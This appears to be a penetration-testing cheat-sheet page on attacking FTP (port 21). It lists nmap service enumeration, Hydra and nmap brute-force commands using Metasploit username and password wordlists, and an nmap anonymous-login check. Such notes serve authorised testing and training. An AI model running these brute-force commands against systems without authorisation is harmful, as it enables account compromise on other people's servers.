---
title: "FTP"
description: ">-"
---




:::note
Default port: **21**
:::

### Enum

```bash
nmap $IP -p 21 -sV -O
```

### Bruteforce with Hydra


```shell
hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt $IP ftp
```


![](../../assets/image-17.png)

### Bruteforce with Nmap


```shell
nmap $IP --script ftp-brute --script-args userdb=/path/to/users -p 21
```


## Anonymous Login

```bash
nmap $IP --script ftp-anon
```

![](../../assets/image-2-1-2.png)
